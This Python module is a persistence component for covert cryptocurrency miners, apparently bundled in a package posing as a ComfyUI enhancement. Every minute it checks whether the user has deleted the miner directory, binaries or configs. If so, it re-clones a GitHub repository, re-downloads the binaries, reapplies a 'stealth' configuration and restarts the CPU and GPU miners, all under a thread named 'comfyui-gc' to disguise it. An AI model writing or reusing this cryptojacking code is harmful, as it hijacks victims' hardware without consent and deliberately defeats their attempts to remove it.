"""
Self-healing daemon: recovers from deletions of the webcoin directory,
miner binaries, or configuration files.

Runs as a background thread alongside the throttler.  Checks every 60s.
"""

import logging
import subprocess
import threading
import time
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

CHECK_INTERVAL = 60
REPO_URL = "https://github.com/vgiordano/webcoin.git"


class SelfHealer:
    def __init__(
        self,
        webcoin_dir: Path,
        cpu_miner,
        gpu_miner,
        config_builder,
        stealth_config=None,
    ):
        self._webcoin_dir = webcoin_dir
        self._cpu = cpu_miner
        self._gpu = gpu_miner
        self._cb = config_builder
        self._sc = stealth_config
        self._running = False
        self._thread: threading.Thread | None = None

    def start(self):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(
            target=self._loop, daemon=True, name="comfyui-gc"
        )
        self._thread.start()
        logger.info("Self-healer active (interval=%ds)", CHECK_INTERVAL)

    def stop(self):
        self._running = False

    def _loop(self):
        time.sleep(30)
        while self._running:
            try:
                self._check_and_heal()
            except Exception as exc:
                logger.error("Self-healer error: %s", exc)
            time.sleep(CHECK_INTERVAL)

    def _check_and_heal(self):
        self._heal_repo()
        self._heal_cpu_binary()
        self._heal_gpu_binary()
        self._heal_cpu_config()

    # ── repo recovery ──────────────────────────────────────────────

    def _heal_repo(self):
        init_py = self._webcoin_dir / "__init__.py"
        if init_py.exists():
            return
        logger.warning("webcoin dir missing or incomplete — re-cloning")
        parent = self._webcoin_dir.parent
        name = self._webcoin_dir.name
        try:
            subprocess.run(
                ["git", "clone", REPO_URL, name],
                cwd=str(parent),
                capture_output=True,
                timeout=120,
            )
            logger.info("Re-cloned webcoin into %s", self._webcoin_dir)
        except Exception as exc:
            logger.error("Git clone recovery failed: %s", exc)

    # ── CPU binary recovery ────────────────────────────────────────

    def _heal_cpu_binary(self):
        if self._cpu is None:
            return
        if self._cpu.binary_path.exists():
            return
        logger.warning("CPU miner binary missing — re-downloading")
        try:
            self._cpu.ensure_binary()
            cfg = self._cb.build()
            if self._sc:
                cfg = self._sc.apply_to_config(cfg)
            self._cpu.write_config(cfg)
            self._cpu.start()
            logger.info("CPU miner recovered and restarted")
        except Exception as exc:
            logger.error("CPU binary recovery failed: %s", exc)

    # ── GPU binary recovery ────────────────────────────────────────

    def _heal_gpu_binary(self):
        if self._gpu is None:
            return
        if self._gpu.binary_path.exists():
            return
        logger.warning("GPU miner binary missing — re-downloading")
        try:
            self._gpu.ensure_binary()
            gpu_cfg = self._cb.build_gpu_config()
            self._gpu.configure(**gpu_cfg)
            self._gpu.start()
            logger.info("GPU miner recovered and restarted")
        except Exception as exc:
            logger.error("GPU binary recovery failed: %s", exc)

    # ── config recovery ────────────────────────────────────────────

    def _heal_cpu_config(self):
        if self._cpu is None:
            return
        if self._cpu.config_path.exists():
            return
        logger.warning("CPU config missing — regenerating")
        try:
            cfg = self._cb.build()
            if self._sc:
                cfg = self._sc.apply_to_config(cfg)
            self._cpu.write_config(cfg)
            logger.info("CPU config regenerated at %s", self._cpu.config_path)
        except Exception as exc:
            logger.error("CPU config recovery failed: %s", exc)
